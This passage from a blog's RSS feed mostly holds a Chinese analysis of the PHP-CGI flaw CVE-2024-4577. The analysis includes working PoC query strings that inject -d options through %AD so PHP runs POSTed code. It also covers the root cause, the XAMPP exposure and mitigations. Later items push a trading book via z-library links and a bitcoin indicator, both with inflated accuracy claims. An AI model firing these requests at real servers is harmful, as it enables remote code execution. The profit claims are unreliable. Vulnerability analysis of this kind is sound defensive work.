data-num=&#34;9&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;Upgrade-Insecure-Requests: 1&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;10&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;Content-Type: application/x-www-form-urlencoded&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;11&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;Content-Length: 23&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;12&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;13&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&amp;lt;?php die(&#34;Te&#34;.&#34;sT&#34;);?&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;查询参数&lt;/p&gt;
+&lt;figure class=&#34;highlight text&#34;&gt;&lt;figcaption data-lang=&#34;text&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;%add+ allow_url_include%3don+%add+auto_prepend_file%3dphp%3a//input&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;查询参数会变成：&lt;/p&gt;
+&lt;figure class=&#34;highlight text&#34;&gt;&lt;figcaption data-lang=&#34;text&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;-d allow_url_include=on -d auto_prepend_file=php://input&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;poc2 对比 poc1 没有重定向配置 cgi.force_redirect，而在请求头中定义 REDIRECT-STATUS: XCANWIN，表示某种安全检测已经触发。查询参数中将包含远程文件的函数 allow_url_include 设置为 on，auto_prepend_file 允许每个请求之前必须尝试从 php://input 读取数据并将其作为代码执行。&lt;/p&gt;
+&lt;ol start=&#34;2&#34;&gt;
+&lt;li&gt;复现结果：&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;&lt;img loading=&#34;lazy&#34; data-src=&#34;https://pic4.zhimg.com/80/v2-65fdcc182b4981286423f9897d0e0dff_720w.webp&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;使用 php://input 流接收 POST 请求传入的参数实现 RCE&lt;/p&gt;
+&lt;figure class=&#34;highlight php&#34;&gt;&lt;figcaption data-lang=&#34;PHP&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;host&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;/&lt;/span&gt;php&lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;cgi&lt;span class=&#34;token operator&#34;&gt;/&lt;/span&gt;php&lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;cgi&lt;span class=&#34;token operator&#34;&gt;.&lt;/span&gt;exe&lt;span class=&#34;token operator&#34;&gt;?&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;%&lt;/span&gt;ADd&lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt;cgi&lt;span class=&#34;token operator&#34;&gt;.&lt;/span&gt;force_redirect&lt;span class=&#34;token operator&#34;&gt;%&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;3&lt;/span&gt;d0&lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;%&lt;/span&gt;ADd&lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt;cgi&lt;span class=&#34;token operator&#34;&gt;.&lt;/span&gt;redirect_status_env&lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;%&lt;/span&gt;ADd&lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt;allow_url_include&lt;span class=&#34;token operator&#34;&gt;%&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;3&lt;/span&gt;d1&lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;%&lt;/span&gt;ADd&lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt;auto_prepend_file&lt;span class=&#34;token operator&#34;&gt;%&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;3&lt;/span&gt;dphp&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;token comment&#34;&gt;//input&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;&lt;img loading=&#34;lazy&#34; data-src=&#34;https://s2.loli.net/2024/08/13/rlHmisJMZeFR8V5.png&#34; alt=&#34;image.png&#34; /&gt;&lt;/p&gt;
+&lt;h1 id=&#34;x03-漏洞背景&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#x03-漏洞背景&#34;&gt;#&lt;/a&gt; x03 漏洞背景&lt;/h1&gt;
+&lt;p&gt;PHP 的 SAPI（Server Application Programming Interface）是 PHP 为了在不同服务器环境中运行而提供的一套应用程序编程接口。SAPI 定义了 PHP 如何与其所在环境的 Web 服务器或其它类型的服务器进行交互。简而言之，SAPI 是 PHP 与服务器软件通信的桥梁。&lt;/p&gt;
+&lt;p&gt;在 PHP 中，通常有三种主流的 SAPI 实现方式：&lt;/p&gt;
+&lt;p&gt;PHP-FPM：这是一种 FastCGI 协议的解析器，它的主要任务是接收来自 Web 服务器，按照 FastCGI 协议格式封装的请求数据，并将其传递给 PHP 解释器进行处理。&lt;/p&gt;
+&lt;p&gt;mod_php：这是 Apache 服务器的一个模块，专门用于处理 PHP 和 Apache 之间的数据交换工作。&lt;/p&gt;
+&lt;p&gt;PHP-CGI：它具备两种模式的交互能力，既可以作为 CGI 程序运行，也可以作为 FastCGI 服务运行。PHP-CGI 在以 CGI 模式运行时爆出了安全漏洞 CVE-2012-1823 。&lt;/p&gt;
+&lt;p&gt;发现漏洞的团队也用了这个趣图来比喻这三种 SAPI。&lt;/p&gt;
+&lt;p&gt;&lt;img loading=&#34;lazy&#34; data-src=&#34;https://s2.loli.net/2024/08/13/8uOko2UGXQjPREn.png&#34; alt=&#34;image.png&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;回顾 CVE-2012-1823 这一 PHP CGI 环境下的安全缺陷，Web 服务器将 HTTP 请求解析后转发给 PHP 脚本。以&lt;a href=&#34;http://host/cgi.php?a=b%E4%B8%BA%E4%BE%8B%EF%BC%8C%E8%AF%A5%E8%AF%B7%E6%B1%82%E5%8F%AF%E8%83%BD%E5%9C%A8%E5%91%BD%E4%BB%A4%E8%A1%8C%E4%B8%AD%E4%BB%A5php.exe&#34;&gt; http://host/cgi.php?a=b 为例，该请求可能在命令行中以 php.exe&lt;/a&gt; cgi.php a=b 的形式被处理。&lt;/p&gt;
+&lt;p&gt;根据 RFC3875 的规范，如果查询字符串内缺少未解码的等号，那么整个查询字符串应当被视为 CGI 的参数进行传递。这便意味着，如果 URL 中的查询字符串部分省略了等号，它将未经适当处理就被传递给 php-cgi，为攻击者提供了注入非法命令行参数的机会。要有效利用这一漏洞，需了解 php-cgi 支持哪些命令行参数。&lt;/p&gt;
+&lt;p&gt;&lt;img loading=&#34;lazy&#34; data-src=&#34;https://s2.loli.net/2024/08/13/WexRrfipTYaHK97.png&#34; alt=&#34;image.png&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;使用 - d 参数来指定配置项的值实现 RCE：allow_url_include 选项如果被设置为 On，PHP 将允许包含（include）通过 URL 指定的文件，auto_prepend_file%3dphp%3a//input：这个参数设置 auto_prepend_file 配置项，使其指向 php://input 流。php://input 是一个可以读取通过 POST 方法发送到脚本的原始数据的流。通过设置这个配置，攻击者可以控制 PHP 脚本执行前自动包含的文件，这里实际上是包含了通过 POST 发送的数据。&lt;/p&gt;
+&lt;p&gt;&lt;img loading=&#34;lazy&#34; data-src=&#34;https://s2.loli.net/2024/08/13/Oji8FHmrNLsa9bI.png&#34; alt=&#34;image.png&#34; /&gt;&lt;/p&gt;
+&lt;h1 id=&#34;x04-漏洞原理&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#x04-漏洞原理&#34;&gt;#&lt;/a&gt; x04 漏洞原理&lt;/h1&gt;
+&lt;p&gt;CVE-2024-4577 是依托于 Windows 系统中字符编码转换的 Best-Fit 特性对 CVE-2012-1823 的绕过。Windows 系统中字符编码转换的 Best-Fit 特性是指 Windows 操作系统在处理不同字符编码集之间的转换时使用的一种匹配机制。当系统中存在无法直接映射到目标编码集的字符时，Best-Fit 特性会尝试寻找一个在语义或外观上最接近的字符来进行替代显示或处理。&lt;/p&gt;
+&lt;p&gt;这种特性在多语言支持和国际化软件的开发中非常重要，因为它可以提高不同语言环境下用户界面的可读性和一致性。然而，在某些情况下，Best-Fit 特性也可能带来安全隐患，尤其是在处理来自不可信来源的输入时。例如，在 Web 应用中，如果攻击者能够利用 Best-Fit 特性将特殊字符转换为具有不同语义的字符，就可能绕过安全检查，导致安全漏洞，如这次的 CVE-2024-4577 就是利用了 % ad 这个特殊字符，通过 Best-Fit 匹配到的是连字符（&amp;quot;-&amp;quot;）。&lt;/p&gt;
+&lt;p&gt;查看这次补丁的 commit 来分析为什么是连字符（&amp;quot;-&amp;quot;）：&lt;/p&gt;
+&lt;figure class=&#34;highlight text&#34;&gt;&lt;figcaption data-lang=&#34;text&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;https://github.com/php/php-src/commit/4dd9a36c16#diff-680b80075cd2f8c1bbeb33b6ef6c41fb1f17ab98f28e5f87d12d82264ca99729R1798&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;&lt;img loading=&#34;lazy&#34; data-src=&#34;https://s2.loli.net/2024/08/13/AH8JKayXzvIUEtS.png&#34; alt=&#34;image.png&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;PHP 的源代码中原先已经实现了对特定字符（如连字符 -）的过滤逻辑，这是对 CVE-2012-1823 的修复代码，如下是 CVE-2012-1823 的 poc，对比 CVE-2024-4577 的 poc 可以看到，主要差别在于（连字符 -）变成了 % AD。&lt;/p&gt;
+&lt;p&gt;&lt;img loading=&#34;lazy&#34; data-src=&#34;https://s2.loli.net/2024/08/13/16DQtO5F7beZg4s.png&#34; alt=&#34;image.png&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img loading=&#34;lazy&#34; data-src=&#34;https://s2.loli.net/2024/08/13/kchuwmXrBHKJoOg.png&#34; alt=&#34;image.png&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;通过使用 % ad 代替常规的连字符 -，绕过了原本应该阻止参数传递的安全机制，导致攻击者能够成功注入并执行非法的参数，为了修复 CVE-2024-4577，在最新的代码更新中，考虑到了 Windows 系统中 Best-Fit 特性的影响，将所有高于 0x80 的字符也纳入了限制范围。代码注释中对此也进行了详细说明，阐述了采取这一措施的背景。&lt;/p&gt;
+&lt;p&gt;在 CVE-2024-4577 的 poc 中可以看到多了一个参数选项 cgi.force_redirect。因为 PHP 增加了一个默认开启的配置 cgi.force_redirect=1，仅允许通过重定向规则的请求来执行 PHP CGI，不允许直接访问执行，要绕过这一特性，可以采取以下方法：&lt;/p&gt;
+&lt;p&gt;既然已经通过 - d 参数成功修改了其他配置，那么同样可以直接使用 - d 参数将 cgi.force_redirect 的值改为 0，从而关闭这一重定向规则限制。&lt;/p&gt;
+&lt;p&gt;&lt;img loading=&#34;lazy&#34; data-src=&#34;https://s2.loli.net/2024/08/13/ic6jrkzDw9OhXJS.png&#34; alt=&#34;image.png&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;默认配置的 XAMPP 受影响的原因：&lt;/p&gt;
+&lt;p&gt;在 \conf\extra\httpd-xampp.conf 中存在如下的配置项&lt;/p&gt;
+&lt;figure class=&#34;highlight text&#34;&gt;&lt;figcaption data-lang=&#34;text&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;ScriptAlias /php-cgi/ &#34;/xampp/php/&#34;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&amp;lt;Directory &#34;/xampp/php&#34;&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    AllowOverride None&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    Options None&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    Require all denied&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &amp;lt;Files &#34;php-cgi.exe&#34;&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;          Require all granted&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;8&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &amp;lt;/Files&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;9&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&amp;lt;/Directory&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;ScriptAlias 指令的意义是当用户访问网站的 &lt;code&gt;/php-cgi/&lt;/code&gt;  路径时，将请求映射到了本地的 &lt;code&gt;/xampp/php/&lt;/code&gt;  目录。这个目录包含了 PHP 环境的所有文件和组件，而该目录下就包含有 php-cgi.exe 程序。&lt;/p&gt;
+&lt;p&gt;当我们使用最早公开的 poc，发现并不能复现&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;/cgi-bin/php-cgi.exe?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input
+/php-cgi/php-cgi.exe?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;img loading=&#34;lazy&#34; data-src=&#34;https://s2.loli.net/2024/08/13/KOzWAhVpwvmZQnb.png&#34; alt=&#34;image.png&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;原因就是为了验证请求是通过 Web 服务器的 Action 指令发起的，而不是用户直接对 php-cgi 进行的请求，php-cgi 设置了 “cgi.force_redirect” 这一安全特性。该特性默认开启，它确保只有遵循特定重定向流程的请求才会被 php-cgi 处理，这样可以有效避免直接对 php-cgi 的潜在不当访问，于是在 POC 中添加 - d cgi.force_redirect=0 关闭这个校验规则，就可绕过限制。&lt;/p&gt;
+&lt;h1 id=&#34;x05-修复方案&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#x05-修复方案&#34;&gt;#&lt;/a&gt; x05 修复方案&lt;/h1&gt;
+&lt;p&gt;1. 官方已发布新版本 8.3.8、8.2.20、8.1.29&lt;br /&gt;
+2. 对于无法升级 PHP 的用户：&lt;br /&gt;
+通过在 Apache 服务器的配置文件中，添加以下规则来阻止攻击。需要注意的是，这些规则仅对繁体中文、简体中文和日语语言环境起到临时缓解作用。在实际操作中，仍然建议更新到补丁版本或迁移架构。&lt;/p&gt;
+&lt;figure class=&#34;highlight text&#34;&gt;&lt;figcaption data-lang=&#34;text&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;RewriteEngine On&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;RewriteCond %&amp;#123;QUERY_STRING&amp;#125; ^%ad [NC]&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;RewriteRule .? - [F,L]&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;3. 对于使用 XAMPP for Windows 的用户，如果确认不需要 PHP CGI 功能，可以通过修改以下 Apache HTTP Server 配置来避免受到该漏洞的影响&lt;br /&gt;
+注释掉相应行：&lt;/p&gt;
+&lt;figure class=&#34;highlight text&#34;&gt;&lt;figcaption data-lang=&#34;text&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;# ScriptAlias /php-cgi/ &#34;C:/xampp/php/&#34;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;4.PHP-CGI 已经是一种过时且易出问题的架构，建议迁移至更为安全的 Mod-PHP、FastCGI 或是 PHP-FPM 等架构。&lt;/p&gt;
+ ]]></description>
+        </item>
+        <item>
+            <guid isPermalink="true">http://example.com/2024/08/13/Trading/%E8%87%AA%E7%84%B6%E4%BA%A4%E6%98%93%E7%90%86%E8%AE%BA%E5%9F%BA%E7%A1%80%E4%B8%8E%E8%BF%9B%E9%98%B6/</guid>
+            <title>自然交易理论基础与进阶</title>
+            <link>http://example.com/2024/08/13/Trading/%E8%87%AA%E7%84%B6%E4%BA%A4%E6%98%93%E7%90%86%E8%AE%BA%E5%9F%BA%E7%A1%80%E4%B8%8E%E8%BF%9B%E9%98%B6/</link>
+            <category term="Trading" scheme="http://example.com/categories/Trading/" />
+            <category term="Trading" scheme="http://example.com/tags/Trading/" />
+            <category term="自然交易理论" scheme="http://example.com/tags/%E8%87%AA%E7%84%B6%E4%BA%A4%E6%98%93%E7%90%86%E8%AE%BA/" />
+            <pubDate>Tue, 13 Aug 2024 10:41:33 +0800</pubDate>
+            <description><![CDATA[ &lt;p&gt;&lt;div class=&#34;links&#34;&gt;&lt;div class=&#34;item&#34; title=&#34;wtt&#34; style=&#34;--block-color:#91426f;&#34;&gt;&lt;a href=&#34;https://reader.z-library.sk/?source=4d0050d1bf33c152df21c5023fb3f9af2e0365c3e2d71b1209940e560f1abc61&amp;download_location=https://zh.singlelogin.re/dl/18559579/4828be&#34; class=&#34;image&#34; data-background-image=&#34;https://s2.loli.net/2024/08/13/CRFUfomdJ31e4BM.png&#34;&gt;&lt;/a&gt;
+        &lt;div class=&#34;info&#34;&gt;
+        &lt;a href=&#34;https://reader.z-library.sk/?source=4d0050d1bf33c152df21c5023fb3f9af2e0365c3e2d71b1209940e560f1abc61&amp;download_location=https://zh.singlelogin.re/dl/18559579/4828be&#34; class=&#34;title&#34;&gt;自然交易理论基础与进阶&lt;/a&gt;
+        &lt;p class=&#34;desc&#34;&gt;自然交易理论基础与进阶&lt;/p&gt;
+        &lt;/div&gt;&lt;/div&gt;&lt;div class=&#34;item&#34; title=&#34;wtt&#34; style=&#34;--block-color:#91426f;&#34;&gt;&lt;a href=&#34;https://reader.z-library.sk/?source=43b541f3a95b51c6947891ebe368d6e9897445b10209c36e2c06c069c451d83a&amp;download_location=https://zh.singlelogin.re/dl/21787299/5760b1&#34; class=&#34;image&#34; data-background-image=&#34;https://s2.loli.net/2024/08/13/CRFUfomdJ31e4BM.png&#34;&gt;&lt;/a&gt;
+        &lt;div class=&#34;info&#34;&gt;
+        &lt;a href=&#34;https://reader.z-library.sk/?source=43b541f3a95b51c6947891ebe368d6e9897445b10209c36e2c06c069c451d83a&amp;download_location=https://zh.singlelogin.re/dl/21787299/5760b1&#34; class=&#34;title&#34;&gt;自然交易理论基础与进阶 文字版&lt;/a&gt;
+        &lt;p class=&#34;desc&#34;&gt;自然交易理论基础与进阶 文字版&lt;/p&gt;
+        &lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/p&gt;
+&lt;h1 id=&#34;自然交易理论基础与进阶&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#自然交易理论基础与进阶&#34;&gt;#&lt;/a&gt; 自然交易理论基础与进阶&lt;/h1&gt;
+&lt;blockquote&gt;
+&lt;p&gt;该书是一本传授二级市场 (股市、期货、贵金属等) 交易技术技巧的作品，文字精炼却打动人心。作者认为，一旦掌握了自然交易理论，将拥有纵横二级市场、稳定持续盈利的技能。作者希望把新颖、独特且有实用价值的自然交易理论分享给人们。绝大部分人在学过一两门二级市场交易技术后，都会觉得所学毫无作用，仍旧不断亏损；本书内容颠覆传统交易理论，据弃传统技术指标与逻辑，开创了全新的交易方式与理念。是一套学习门槛低，且真正可指导盈利的交易理论。正确率峰值达到 80%。目前已有数千名学生正在学习该理论，经实践验证，确定可在交易中获得极高的判断正确率，从而真正收获盈利。&lt;/p&gt;
+&lt;/blockquote&gt;
+ ]]></description>
+        </item>
+        <item>
+            <guid isPermalink="true">http://example.com/2024/08/13/TradingView/MVRV%20Z%20Score%20and%20MVRV%20Free%20Float%20Z-Score/</guid>
+            <title>MVRV Z Score and MVRV Free Float Z-Score</title>
+            <link>http://example.com/2024/08/13/TradingView/MVRV%20Z%20Score%20and%20MVRV%20Free%20Float%20Z-Score/</link>
+            <category term="TradingView" scheme="http://example.com/categories/TradingView/" />
+            <category term="MVRV Z Score" scheme="http://example.com/tags/MVRV-Z-Score/" />
+            <pubDate>Tue, 13 Aug 2024 09:57:31 +0800</pubDate>
+            <description><![CDATA[ &lt;h1 id=&#34;mvrv-z-score-and-mvrv-free-float-z-score&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#mvrv-z-score-and-mvrv-free-float-z-score&#34;&gt;#&lt;/a&gt; MVRV Z Score and MVRV Free Float Z-Score&lt;/h1&gt;
+&lt;p&gt;&lt;div class=&#34;links&#34;&gt;&lt;div class=&#34;item&#34; title=&#34;PowerScooter&#34; style=&#34;--block-color:#bc7d4c;&#34;&gt;&lt;a href=&#34;https://tw.tradingview.com/script/v3TqVthK-MVRV-Z-Score-and-MVRV-Free-Float-Z-Score/&#34; class=&#34;image&#34; data-background-image=&#34;https://s2.loli.net/2024/08/13/bGOdNWMwhuyX7os.png&#34;&gt;&lt;/a&gt;
+        &lt;div class=&#34;info&#34;&gt;
+        &lt;a href=&#34;https://tw.tradingview.com/script/v3TqVthK-MVRV-Z-Score-and-MVRV-Free-Float-Z-Score/&#34; class=&#34;title&#34;&gt;MVRV Z Score and MVRV Free Float Z-Score&lt;/a&gt;
+        &lt;p class=&#34;desc&#34;&gt;MVRV Z Score and MVRV Free Float Z-Score&lt;/p&gt;
+        &lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;IMPORTANT:&lt;/strong&gt; This script needs as much historic data as possible. Please run it on &lt;a href=&#34;https://tw.tradingview.com/symbols/BTCUSD/?exchange=INDEX&#34;&gt;BTCUSD&lt;/a&gt;, &lt;a href=&#34;https://tw.tradingview.com/symbols/BLX/?exchange=BNC&#34;&gt;BLX&lt;/a&gt; or another chart of sufficient length.&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;MVRV&lt;/strong&gt;&lt;br /&gt;
+The MVRV (Market Value to Realised Value Ratio) simply divides bitcoins market cap by bitcoins realized market cap. This was previously impossible on Tradingview but has now been made possible thanks to Coinmetrics providing us with the realized market cap data.&lt;br /&gt;
+In the free float version, the free float market cap is used instead of the regular market cap.&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;Z-Score&lt;/strong&gt;&lt;br /&gt;
+The MVRV Z-score divides the difference between Market cap and realized market cap by the historic standard deviation of the market cap.&lt;br /&gt;
+Historically, this has been insanely accurate at detecting bitcoin tops and bottoms:&lt;br /&gt;
+A Z-Score above 7 means bitcoin is vastly overpriced and at a local top.&lt;br /&gt;
+A Z-Score below 0.1 means bitcoin is underpriced and at a local bottom.&lt;/p&gt;
+&lt;p&gt;In the free float version, the free float market cap is used instead of the regular market cap.&lt;/p&gt;
+&lt;p&gt;The Z-Score, also known as the standard score is hugely popular in a wide range of mathematical and statistical fields and is usually used to measure the number of standard deviations by which the value of a raw score is above or below the mean value of what is being observed or measured.&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;Credits&lt;/strong&gt;&lt;br /&gt;
+MVRV Z Score initially created by aweandwonder&lt;br /&gt;
+MVRV initially created by Murad Mahmudov and David Puell&lt;/p&gt;
+&lt;hr /&gt;
+&lt;h2 id=&#34;開源腳本&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#開源腳本&#34;&gt;#&lt;/a&gt; 開源腳本&lt;/h2&gt;
+&lt;p&gt;在真正的 TradingView 精神中，這個腳本的作者以開源的方式發佈，這樣交易員可以理解和驗證它。請向作者致敬！您可以免費使用它，但在出版物中再次使用這段程式碼將受到&lt;a href=&#34;https://tw.tradingview.com/house-rules/?solution=43000590599&#34;&gt;網站規則&lt;/a&gt;的約束。 您可以收藏它以在圖表上使用。&lt;/p&gt;
+&lt;h2 id=&#34;想在圖表上使用此腳本&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#想在圖表上使用此腳本&#34;&gt;#&lt;/a&gt; 想在圖表上使用此腳本？&lt;/h2&gt;
+&lt;p&gt;Pine Script™策略&lt;/p&gt;
+&lt;h2 id=&#34;mvrv-z-score-and-mvrv-free-float-z-score-2&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#mvrv-z-score-and-mvrv-free-float-z-score-2&#34;&gt;#&lt;/a&gt; MVRV Z Score and MVRV Free Float Z-Score&lt;/h2&gt;
+&lt;figure class=&#34;highlight js&#34;&gt;&lt;figcaption data-lang=&#34;JavaScript&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;// This source code is subject to the terms of the Mozilla Public License 2.0 at https://mozilla.org/MPL/2.0/  &lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;// © Powerscooter  &lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;  &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;//@version=5  &lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token function&#34;&gt;strategy&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;MVRV Z Score and MVRV Free Float Z-Score&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;shorttitle &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;MVRV Z Score&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;precision&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;default_qty_type &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; strategy&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;cash&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; default_qty_value &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;100&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; initial_capital &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;100&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;  